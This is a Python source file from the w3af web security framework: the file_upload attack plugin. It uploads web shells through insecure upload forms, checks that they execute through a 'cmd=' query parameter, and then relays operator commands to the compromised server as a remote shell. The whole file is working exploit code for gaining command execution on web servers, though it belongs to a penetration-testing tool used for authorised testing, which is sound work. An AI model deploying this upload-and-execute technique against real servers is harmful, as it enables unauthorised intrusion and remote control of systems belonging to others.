"""
file_upload.py

Copyright 2006 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

"""
import w3af.core.controllers.output_manager as om
import w3af.plugins.attack.payloads.shell_handler as shell_handler

from w3af.core.data.kb.exec_shell import ExecShell
from w3af.core.data.fuzzer.utils import rand_alpha
from w3af.core.controllers.exceptions import BaseFrameworkException
from w3af.core.controllers.plugins.attack_plugin import AttackPlugin
from w3af.core.controllers.misc.io import NamedStringIO
from w3af.plugins.attack.payloads.decorators.exec_decorator import exec_debug


class file_upload(AttackPlugin):
    """
    Exploit applications that allow unrestricted file uploads inside the webroot.
    :author: Andres Riancho (andres.riancho@gmail.com)
    """

    def __init__(self):
        AttackPlugin.__init__(self)

    def get_attack_type(self):
        """
        :return: The type of exploit, SHELL, PROXY, etc.
        """
        return 'shell'

    def get_kb_location(self):
        """
        This method should return the vulnerability name (as saved in the kb)
        to exploit. For example, if the audit.os_commanding plugin finds an
        vuln, and saves it as:

        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )

        Then the exploit plugin that exploits os_commanding
        ( attack.os_commanding ) should return 'os_commanding' in this method.
        """
        return ['file_upload']

    def _generate_shell(self, vuln_obj):
        """
        :param vuln_obj: The vuln to exploit.
        :return: True is a shell object based on the param vuln was created ok.
        """
        # Check if we really can execute commands on the remote server
        exploit_url = self._verify_vuln(vuln_obj)

        if exploit_url is not None:

            # Set shell parameters
            shell_obj = FileUploadShell(vuln_obj, self._uri_opener,
                                        self.worker_pool, exploit_url)
            return shell_obj
        else:
            return None

    def _verify_vuln(self, vuln_obj):
        """
        This command verifies a vuln. This is really hard work! :P

        :param vuln_obj: The vuln to exploit.
        :return : True if vuln can be exploited.
        """
        if not vuln_obj.get_mutant().get_fuzzable_request().get_file_vars():
            return None

        url = vuln_obj.get_url()
        extension = url.get_extension()

        for file_content, file_name in self._get_web_shells(extension):
            exploit_url = self._upload_shell_and_confirm_exec(vuln_obj,
                                                              file_content,
                                                              file_name)

            if exploit_url is not None:
                return exploit_url

        #   If we got here, there is nothing positive to report
        return None

    def _upload_shell_and_confirm_exec(self, vuln_obj, file_content, file_name):
        """
        :return: True if we were able to upload and the remote server actually
                 executes the remote file.
        """
        mutant = vuln_obj.get_mutant()
        mutant = mutant.copy()

        # Create a file that will be uploaded
        file_handler = NamedStringIO(file_content, file_name)
        mutant.set_token_value(file_handler)

        # For the files which are not in the target, set something smart.
        mutant.get_dc().smart_fill()

        # Upload the file
        self._uri_opener.send_mutant(mutant)

        # Call the uploaded script with an empty value in cmd parameter
        # this will return the shell_handler.SHELL_IDENTIFIER if success
        dst = vuln_obj['file_dest']
        exploit_url = dst.get_domain_path().url_join(file_name)
        exploit_url.querystring = u'cmd='
        response = self._uri_opener.GET(exploit_url)

        if shell_handler.SHELL_IDENTIFIER in response.get_body():
            return exploit_url

        return None

    def _get_web_shells(self, extension):
        """
        :yield: Tuples with file_content and file_name for web shells.
        """
        for shell_str, orig_extension in shell_handler.get_webshells(extension):
            # If the webshell was webshell.php this will return a file_name
            # containing kgiwjxh.php (8 rand and the extension)
            file_name = '%s.%s' % (rand_alpha(8), orig_extension)
            yield shell_str, file_name

            # Now we want to return the webshell content <?php ... ?> but in a
            # file with the extension that the upload URL had. This makes our
            # chances of getting access a little greater
            file_name = '%s.%s' % (rand_alpha(8), extension)
            yield shell_str, file_name

    def get_root_probability(self):
        """
        :return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        """
        return 0.8

    def get_long_desc(self):
        """
        :return: A DETAILED description of the plugin functions and features.
        """
        return """
        This plugin exploits insecure file uploads and returns a shell. It's
        rather simple, using an html form the plugin uploads the corresponding
        webshell (php, asp, etc.) verifies that the shell is working, and if
        everything is working as expected the user can start typing commands.

        No configurable parameters exist.
        """


class FileUploadShell(ExecShell):

    def __init__(self, vuln, uri_opener, worker_pool, exploit_url):
        super(FileUploadShell, self).__init__(vuln, uri_opener, worker_pool)
        
        self._exploit_url = exploit_url
            
    def get_exploit_url(self):
        return self._exploit_url

    @exec_debug
    def execute(self, command):
        """
        This method is called when a user writes a command in the shell and
        hits enter.

        Before calling this method, the framework calls the generic_user_input
        method from the shell class.

        :param command: The command to handle ( ie. "read", "exec", etc ).
        :return: The result of the command.
        """
        to_send = self.get_exploit_url()
        to_send.querystring = u'cmd=' + command
        response = self._uri_opener.GET(to_send)
        return shell_handler.extract_result(response.get_body())

    def end(self):
        msg = 'File upload shell is going to delete the webshell that was'\
              ' uploaded before.'
        om.out.debug(msg)
        file_to_del = self.get_exploit_url().get_file_name()

        try:
            self.unlink(file_to_del)
        except BaseFrameworkException as e:
            msg = 'File upload shell cleanup failed with exception: "%s".'
            om.out.error(msg % e)
        else:
            msg = 'File upload shell cleanup complete; successfully removed'\
                  ' file: "%s".' % file_to_del
            om.out.debug(msg)

    def get_name(self):
        return 'file_upload'

    def __reduce__(self):
        """
        Need to define this method since the Shell class defines it, and we have
        a different number of __init__ parameters.
        """
        return self.__class__, (self._vuln, None, None, self._exploit_url)